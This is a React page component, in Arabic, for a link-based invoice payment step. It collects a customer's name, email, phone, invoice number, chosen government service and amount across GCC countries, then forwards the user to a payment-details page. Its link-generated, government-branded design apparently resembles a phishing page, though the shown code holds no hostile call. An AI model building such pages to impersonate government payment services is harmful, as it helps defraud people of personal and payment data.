import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getCountryByCode } from "@/lib/countries";
import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { ArrowLeft, User, Mail, Phone, CreditCard, Hash } from "lucide-react";

const PaymentData = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();

  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [selectedService, setSelectedService] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("");

  // Get query parameters from URL
  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || 'payment';

  const serviceName = "دفع فاتورة";
  const paymentInfo = linkData?.payload as any;

  // Get country from link data
  const countryCode = paymentInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";

  // Get government services for the country
  const governmentServices = useMemo(
    () => getGovernmentServicesByCountry(countryCode),
    [countryCode]
  );

  // Get selected government service details
  const selectedServiceData = useMemo(
    () => governmentServices.find(s => s.key === selectedService),
    [governmentServices, selectedService]
  );

  // Get amount from link data
  const rawAmount = paymentInfo?.payment_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Set initial payment amount from link data
  useState(() => {
    if (amount && !paymentAmount) {
      setPaymentAmount(amount.toString());
    }
  });

  // Calculate formatted amount dynamically based on input
  const displayAmount = paymentAmount ? parseFloat(paymentAmount) : amount;
  const formattedAmount = formatCurrency(displayAmount, countryCode);

  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!linkData) return;

    // Update link with payment data
    try {
      const updatedData = {
        ...linkData.payload,
        payment_data: {
          customer_name: customerName,
          customer_email: customerEmail,
          customer_phone: customerPhone,
          invoice_number: invoiceNumber,
          selected_service: selectedService,
          selected_service_name: selectedServiceData?.nameAr || selectedService,
          payment_amount: parseFloat(paymentAmount) || amount,
          currency_code: getCurrencyCode(countryCode),
        },
        selectedCountry: countryCode,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedData,
      });

      // Navigate to payment details
      navigate(`/pay/${id}/details`);
    } catch (error) {
      console.error("Error updating payment data:", error);
    }
  };

  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formatCurrency(amount, countryCode)}
        title="دفع فاتورة - إكمال البيانات"
        description="قم بإكمال بيانات السداد لدفع الفاتورة"
      />
      <div className="min-h-screen bg-background" dir="rtl">
        {/* Hero Section */}
        <div
          className="relative w-full h-40 xs:h-44 sm:h-56 md:h-64 lg:h-72 overflow-hidden"
          style={{
            background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
          }}
        >
          <div className="absolute inset-0 bg-black/30" />
          <div className="absolute bottom-3 right-3 xs:bottom-4 xs:right-4 sm:bottom-6 sm:right-6 md:bottom-8 md:right-8 text-white">
            <div className="text-right">
              <h2 className="text-base xs:text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold mb-0.5 xs:mb-1">{serviceName}</h2>
              <p className="text-[10px] xs:text-xs sm:text-sm md:text-base opacity-90">{countryData?.nameAr}</p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 xs:px-4 sm:px-6 md:px-8 -mt-6 xs:-mt-8 sm:-mt-10 md:-mt-12 relative z-10 pb-6 xs:pb-8 sm:pb-10 md:pb-12">
          <div className="max-w-xl xs:max-w-2xl lg:max-w-3xl xl:max-w-4xl mx-auto">
            <Card className="p-4 xs:p-5 sm:p-6 md:p-8 lg:p-10 shadow-2xl border-t-4 rounded-xl xs:rounded-2xl" style={{ borderTopColor: countryData?.primaryColor }}>
              <form onSubmit={handleProceed}>
                <div className="flex items-center justify-between mb-5 xs:mb-6 sm:mb-7 md:mb-8 gap-3">
                  <h1 className="text-lg xs:text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold flex-1 min-w-0">إكمال بيانات السداد</h1>

                  <div
                    className="w-12 h-12 xs:w-14 xs:h-14 sm:w-16 sm:h-16 md:w-20 md:h-20 rounded-xl xs:rounded-2xl flex items-center justify-center shadow-lg flex-shrink-0"
                    style={{
                      background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
                    }}
                  >
                    <CreditCard className="w-6 h-6 xs:w-7 xs:h-7 sm:w-8 sm:h-8 md:w-10 md:h-10 text-white" />
                  </div>
                </div>

                <div className="space-y-3 xs:space-y-3.5 sm:space-y-4 md:space-y-5 mb-5 xs:mb-6 sm:mb-7 md:mb-8">
                  {/* Customer Name */}
                  <div>
                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
                      <User className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                      الاسم الكامل *
                    </Label>
                    <Input
                      id="name"
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      required
                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                      placeholder="أدخل اسمك الكامل"
                    />
                  </div>

                  {/* Customer Email */}
                  <div>
                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
                      <Mail className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                      البريد الإلكتروني *
                    </Label>
                    <Input
                      id="email"
                      type="email"
                      value={customerEmail}
                      onChange={(e) => setCustomerEmail(e.target.value)}
                      required
                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                      placeholder="example@email.com"
                    />
                  </div>

                  {/* Customer Phone */}
                  <div>
                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
                      <Phone className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                      رقم الهاتف *
                    </Label>
                    <Input
                      id="phone"
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      required
                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                      placeholder={`${phoneCode} ${phonePlaceholder}`}
                    />
                  </div>

                  {/* Invoice Number */}
                  <div>
                    <Label htmlFor="invoice" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
                      <Hash className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                      الرقم المفوتر *
                    </Label>
                    <Input
                      id="invoice"
                      value={invoiceNumber}
                      onChange={(e) => setInvoiceNumber(e.target.value)}
                      required
                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                      placeholder="مثال: INV-12345"
                    />
                  </div>

                  {/* Government Service Selection */}
                  <div>
                    <Label className="mb-2 text-xs xs:text-sm sm:text-base font-medium">الخدمة الحكومية/العامة *</Label>
                    <Select value={selectedService} onValueChange={setSelectedService}>
                      <SelectTrigger className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg">
                        <SelectValue placeholder="اختر الخدمة" />
                      </SelectTrigger>
                      <SelectContent className="bg-background z-50">
                        {governmentServices.map((service) => (
                          <SelectItem key={service.id} value={service.key}>
                            {service.nameAr}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    {selectedServiceData && (
                      <p className="text-xs text-muted-foreground mt-1">
                        {selectedServiceData.description}
                      </p>
                    )}
                  </div>

                  {/* Payment Amount */}
                  <div>
                    <Label htmlFor="amount" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
                      <CreditCard className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                      مبلغ السداد *
                    </Label>
                    <Input
                      id="amount"
                      type="number"
                      value={paymentAmount}
                      onChange={(e) => setPaymentAmount(e.target.value)}
                      required
                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                      placeholder={`${amount} ${getCurrencySymbol(countryCode)}`}
                      step="0.01"
                      min="0"
                    />
                    <p className="text-xs text-muted-foreground mt-1">
                      المبلغ الافتراضي: {formatCurrency(amount, countryCode)}
                    </p>
                  </div>
                </div>

                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-sm xs:text-base sm:text-lg md:text-xl h-12 xs:h-13 sm:h-14 md:h-16 text-white rounded-lg xs:rounded-xl font-semibold transition-transform hover:scale-[1.02] active:scale-[0.98]"
                  style={{
                    background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`
                  }}
                  disabled={!customerName || !customerEmail || !customerPhone || !invoiceNumber || !selectedService || !paymentAmount}
                >
                  <span className="ml-2">التالي</span>
                  <ArrowLeft className="w-4 h-4 xs:w-5 xs:h-5 sm:w-5 sm:h-5 mr-2" />
                </Button>

                <p className="text-[10px] xs:text-xs sm:text-sm text-center text-muted-foreground mt-3 xs:mt-4 sm:mt-5">
                  بالمتابعษ، أنت توافق على الشروط والأحكام
                </p>
              </form>
            </Card>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentData;
